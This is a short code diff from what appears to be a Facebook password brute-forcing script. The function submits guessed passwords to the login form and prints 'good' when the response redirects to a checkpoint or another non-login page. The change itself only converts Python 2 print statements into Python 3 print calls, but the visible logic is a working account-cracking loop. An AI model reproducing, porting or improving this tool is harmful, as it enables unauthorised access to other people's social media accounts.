@@ -137,13 +137,13 @@ def facebook_motah():
      br.form['pass'] = go
      sub = br.submit()
      log = sub.geturl()
-     print b, 'Check===> ', r, go
+     print (b, 'Check===> ', r, go)
      if 'https://www.facebook.com/checkpoint/?next' in log:
-         print g, 'good ---------> ', c, go
+         print (g, 'good ---------> ', c, go)
      elif 'https://www.facebook.com/login.php' in log:
-         print ''
+         print ('')
      else:
-         print g, 'good ---------> ', g, go
+         print (g, 'good ---------> ', g, go)
      sem()
  
 
